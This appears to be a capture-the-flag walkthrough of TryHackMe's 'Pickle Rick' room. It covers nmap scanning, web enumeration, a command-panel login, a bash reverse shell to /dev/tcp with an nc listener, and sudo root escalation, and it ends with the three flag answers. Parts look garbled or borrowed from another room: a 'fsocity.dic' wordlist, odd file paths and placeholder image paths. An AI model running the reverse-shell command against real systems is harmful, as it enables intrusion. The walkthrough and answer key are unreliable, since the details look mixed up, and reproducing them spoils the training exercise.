---
title: Pickle Rick
categories: [TryHackMe]
tags: [Linux, easy]
image: images/Rick/Rick.png
---

**Pickle Rick** is an **easy** rated room on **TryHackMe** inspired by the *Rick and Morty* series. This walkthrough guides you through using a custom portal to find the three secret ingredients to reverse Rick's pickle transformation.

# 1. Initial Reconnaissance and Scanning

Gather information about the target machine.

### Nmap Scan
Run an Nmap scan to identify open ports and services:

```console
nmap -sC -sV -oN nmap_scan <Target_IP>
```

- `-sC`: Runs default scripts for vulnerability checks.
- `-sV`: Detects service versions.
The scan reveals port 80 (HTTP) is open.

![nmap](../images/Rick/namp.png)

# 2. Web Enumeration

Explore the web interface.

### Access the Portal
Visit `http://<Target_IP>` to access the *Rick and Morty*-themed portal. Check the page source for clues. A note reveals the username: **RickRul3s**.

### Check robots.txt
Retrieve hidden files:

```console
curl http://<Target_IP>/robots.txt
```

This uncovers:
- `fsocity.dic`: A password wordlist.
- `Sup3rS3cretPickl3Ingred.txt`: A file hinting at ingredients.
Retrieve them:

```console
wget http://<Target_IP>/fsocity.dic
wget http://<Target_IP>/Sup3rS3cretPickl3Ingred.txt
```

The first ingredient is **mr_meeseek_hair**.

# 3. Accessing the Command Panel

Navigate to `http://<Target_IP>/portal` to access the command panel.

### Login
Use the credentials from the page source:
- Username: **RickRul3s**
- Password: (Brute-force with `fsocity.dic` if needed via external tool).

### Execute Commands
Use the command panel to list files:

```console
ls -la
```

This reveals files like `Sup3rS3cretPickl3Ingred.txt`, `clue.txt`, etc.
![Directory Listing](path/to/directory_listing.png)

# 4. Gaining a Reverse Shell

### Set Up Listener
On your machine, start a Netcat listener:

```console
nc -lvnp 4444
```

### Execute Reverse Shell
In the command panel, enter:

```console
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Replace `10.10.10.10` with your IP. After execution, you should see a connection in your listener.
![Reverse Shell Connection](path/to/reverse_shell.png)

# 5. Privilege Escalation

With the shell, escalate privileges.

### Navigate and List Files
From the shell:

```console
cd /home
ls
cd rick
ls
cd less_second_ingredients
less second_ingredients
```

The second ingredient is **jerry_tear**.

### Escalate to Root
Check sudo privileges:

```console
sudo -l
```

If `(ALL) NOPASSWD: ALL` is allowed, run:

```console
sudo su
cd /root
ls
less 3rd.txt
```

The third ingredient is **fleebs_juice**.
![Sudo Privilege Check](path/to/sudo_check.png)

# 6. Capture the Ingredients

- **First Ingredient**: **mr_meeseek_hair** (from `Sup3rS3cretPickl3Ingred.txt`).
- **Second Ingredient**: **jerry_tear** (from `less_second_ingredients/second_ingredients`).
- **Third Ingredient**: **fleebs_juice** (from `/root/3rd.txt`).

# 7. Final Thoughts

You’ve successfully found all three ingredients: **mr_meeseek_hair**, **jerry_tear**, and **fleebs_juice** to help Rick. This challenge leverages a custom portal and basic Linux skills. Great job, Morty!